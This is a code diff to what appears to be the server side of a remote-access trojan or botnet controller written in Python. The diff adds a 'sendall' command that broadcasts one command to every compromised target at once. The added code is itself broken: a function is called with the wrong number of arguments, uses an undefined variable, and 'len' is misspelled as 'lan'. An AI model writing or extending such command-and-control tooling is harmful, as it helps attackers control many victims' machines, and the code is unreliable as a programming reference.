@@ -6,6 +6,12 @@ import os
 import base64
 import threading
 
+count = 0
+
+def sendtoall(data):
+    json_data = json.dumps(data)
+    target.send(json_data)
+
 def shell(target, ip):
     def reliable_send(data):
         json_data = json.dumps(data)
@@ -113,3 +119,16 @@ while True:
         stop_threads = True
         t1.join()
         break
+    elif command[:7] == "sendall":
+        length_of_targets = lan(targets)
+        i = 0
+        try:
+            while i < length_of_targets:
+                tarnumber = targets[i]
+                print(tarnumber)
+                sendtoall(tarnumber, command)
+                i += 1
+        except:
+            print("[!!] Failed to send command to all targets")
+    else:
+        print("[!!] Command doesnt exist!")
